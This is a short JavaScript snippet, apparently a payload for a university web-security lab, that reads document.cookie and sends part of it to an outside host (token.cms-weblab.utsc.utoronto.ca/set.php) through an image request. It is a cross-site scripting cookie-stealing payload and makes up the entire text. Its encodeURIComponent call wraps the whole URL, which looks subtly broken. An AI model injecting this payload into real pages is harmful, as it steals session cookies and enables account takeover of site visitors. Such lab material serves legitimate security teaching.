var myImage = new Image(100, 200);
myImage.src = encodeURIComponent("http://token.cms-weblab.utsc.utoronto.ca/set.php?sid=1001618966&token=") + document.cookie.substring(10); 
document.body.appendChild(myImage);
